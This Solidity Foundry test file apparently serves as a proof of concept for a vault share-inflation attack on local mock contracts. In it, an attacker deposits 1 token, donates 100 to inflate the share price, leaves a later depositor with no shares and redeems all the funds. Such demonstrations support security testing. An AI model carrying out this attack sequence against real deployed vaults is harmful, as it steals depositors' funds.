//SPDX-Licence-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {VaultContract} from "../src/VaultContract.sol";
import {MockToken} from "../src/MockToken.sol";

contract VaultTest is Test {
    VaultContract private vaultContract;
    MockToken private mockToken;
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");
    uint256 initialBalance = 1e18;

    function setUp() public {
        mockToken = new MockToken();
        vaultContract = new VaultContract(mockToken);

        mockToken.transfer(address(user), initialBalance);
        mockToken.transfer(address(attacker), initialBalance);
    }

    function testVaultInflationAttack() public {
        uint256 amount = 100;
        // Attacker deposits 1 amount of token
        vm.startPrank(attacker);
        mockToken.approve(address(vaultContract), 1);
        console2.log("1. Attacker deposits 1 amount of token to the vault");
        vaultContract.deposit(1, attacker);
        console2.log("   Attacker shares = ", vaultContract.balanceOf(address(attacker)));
        console2.log("   Vault total assets = ", vaultContract.totalAssets());
        // Attacker donate 100e18 amount of token
        console2.log("2. Attacker transfer 100 amount of token to the vault ");
        mockToken.transfer(address(vaultContract), amount);
        console2.log("   Vault total assets = ", vaultContract.totalAssets());
        vm.stopPrank();

        // user deposit 100e18 amount of token
        vm.startPrank(user);
        mockToken.approve(address(vaultContract), amount);
        console2.log("3. user deposits 100 amount of token to the vault");
        vaultContract.deposit(amount, user);
        console2.log("   user shares = ", vaultContract.balanceOf(address(user)));
        console2.log("   Vault total assets = ", vaultContract.totalAssets());
        vm.stopPrank();

        vm.startPrank(attacker);
        // Redeem
        vaultContract.redeem(vaultContract.balanceOf(address(attacker)), attacker, attacker);
        console2.log("4. Attacker redeem all shares");
        console2.log("   Attacker Balance === ", mockToken.balanceOf(address(attacker)));
        console2.log("   Vault total assets = ", vaultContract.totalAssets());
        vm.stopPrank();

        assertEq(mockToken.balanceOf(address(attacker)), initialBalance + amount);
    }
}
